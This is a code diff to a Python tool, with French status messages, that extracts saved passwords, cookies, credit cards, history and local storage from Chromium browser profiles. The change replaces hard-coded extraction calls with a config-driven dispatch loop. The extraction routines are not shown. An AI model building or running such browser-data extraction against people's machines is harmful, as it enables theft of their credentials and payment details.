@@ -1,6 +1,6 @@
 from Crypto.Cipher import AES
 from classes import Profile, Browser
-from config import CHROMIUM_BROWSERS
+from config import CHROMIUM_BROWSERS, OPTIONS
 import subprocess
 import shutil
 import json
@@ -458,22 +458,25 @@ def extract_data():
 
         if not browser.profiles:
             print(f"🔍 Extraction des données pour le profil par défaut")
-            # extract_passwords(browser)
-            # extract_history(browser)
-            # extract_download_history(browser)
-            # extract_cookies(browser)
-            # extract_bookmarks(browser)
-            # extract_extensions(browser)
-            # extract_credit_cards(browser)
-            extract_local_storage(browser)
+            for key, opt in OPTIONS.items():
+                if opt["active"]:
+                    func_name = f"extract_{key}"
+                    func = globals().get(func_name)
+                    if callable(func):
+                        func(browser)
+                    else:
+                        print(f"Fonction {func_name} introuvable.")
+
         else:
             for profile in browser.profiles:
                 print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
-                # extract_passwords(browser, profile)
-                # extract_history(browser, profile)
-                # extract_download_history(browser, profile)
-                # extract_cookies(browser, profile)
-                # extract_bookmarks(browser, profile)
-                # extract_extensions(browser, profile)
-                # extract_credit_cards(browser, profile)
-                extract_local_storage(browser, profile)
+                for key, opt in OPTIONS.items():
+                    if opt["active"]:
+                        func_name = f"extract_{key}"
+                        func = globals().get(func_name)
+                        if callable(func):
+                            func(browser, profile)
+                        else:
+                            print(f"Fonction {func_name} introuvable.")
+                        
+    print("✅ Extraction terminée")
